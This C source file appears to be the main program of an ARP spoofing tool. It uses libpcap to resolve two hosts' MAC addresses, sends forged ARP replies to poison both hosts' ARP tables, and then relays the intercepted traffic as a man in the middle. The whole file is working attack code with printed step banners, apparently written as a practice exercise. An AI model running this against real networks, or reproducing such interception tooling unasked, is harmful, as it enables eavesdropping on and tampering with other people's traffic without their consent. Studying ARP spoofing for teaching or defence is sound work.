#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include "arp_spoofing.h"

void usage(void) {
    printf("Usage : ./arp_spoofing <interface> <sender ip1> <target ip1> \n");
    printf("sample: ./arp_spoofing wlan0 192.168.10.2 192.168.10.1\n");
    exit(0);
}

int main(int argc, char * argv[]) {
    if (argc != 4)                // sender ip & target ip have to be paired. || max == 100 pairs
        usage();    

    const char * dev = argv[1];
                                     // interface name
    uint8_t sender_ip[4];
    str_to_ip(sender_ip, argv[2]);
    uint8_t receiver_ip[4];
    str_to_ip(receiver_ip, argv[3]);

    uint8_t my_mac[6];
    get_mac(my_mac, dev);
    uint8_t my_ip[4];
    get_ip(my_ip, dev);

    uint8_t sender_mac[6];
    uint8_t receiver_mac[6];

    u_char hdr_buf[IP_size];
    u_char payload_buf[1024];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

// ==========================================================================================
// ==========================================================================================

    printf("=========================================================\n");
    printf("[+] 1. Infect Sender's ARP Table\n");
    printf("=========================================================\n");
    
    printf("\n[+] 1-1. Send ARP request packet. Who is [sender's ip]\n\n");
    send_ARP_req(my_mac, my_ip, sender_ip, handle);
    printf("\n[+] Success! 1-1\n\n");
    
    printf("*******************************************\n");

    printf("\n[+] 1-2. Receive ARP reply packet from sender\n");
    recv_ARP_rep(sender_ip, sender_mac, handle);
    
    printf("\n");
    printf("sender's mac : ");
    for(int i=0; i<6; i++) {
        printf("%02X", sender_mac[i]);
        if (i == 5) printf("\n");
        else printf(":");
    }

    printf("\n[+] Success! 1-2\n\n");

    printf("*******************************************\n");

    printf("\n[+] 1-3. Send fake ARP reply packet to sender \n\n");
    send_fake_ARP_rep(sender_mac, sender_ip, my_mac, receiver_ip, handle);
    printf("\n[+] Success! 1-3\n\n");

    printf("*******************************************\n\n");

 // ==========================================================================================
 // ==========================================================================================

    printf("=========================================================\n");
    printf("[+] 2. Infect Receiver's ARP Table\n");
    printf("=========================================================\n");
    
    printf("\n[+] 2-1. Send ARP request packet. Who is [receiver's ip]\n\n");
    send_ARP_req(my_mac, my_ip, receiver_ip, handle);
    printf("\n[+] Success! 2-1\n\n");

    printf("*******************************************\n");

    printf("\n[+] 2-2. Receive ARP reply packet from receiver\n\n");
    recv_ARP_rep(receiver_ip, receiver_mac, handle);

    printf("receiver's mac : ");
    for(int i=0; i<6; i++) {
        printf("%02X", receiver_mac[i]);
        if (i == 5) printf("\n");
        else printf(":");
    }

    printf("\n[+] Success! 2-2\n\n");

    printf("*******************************************\n");

    printf("\n[+] 1-3. Send fake ARP reply packet to receiver\n\n");
    send_fake_ARP_rep(receiver_mac, receiver_ip, my_mac, sender_ip, handle);
    printf("\n[+] Success! 1-3\n\n");

    printf("*******************************************\n\n");

// ==========================================================================================
// ==========================================================================================    

    printf("=========================================================\n");
    printf("[+] 3. Spoof and Relay\n");
    printf("=========================================================\n");

    spoof_and_relay(handle, my_mac, my_ip, sender_mac, sender_ip, receiver_mac, receiver_ip);

    
// ==========================================================================================
    return 0;
}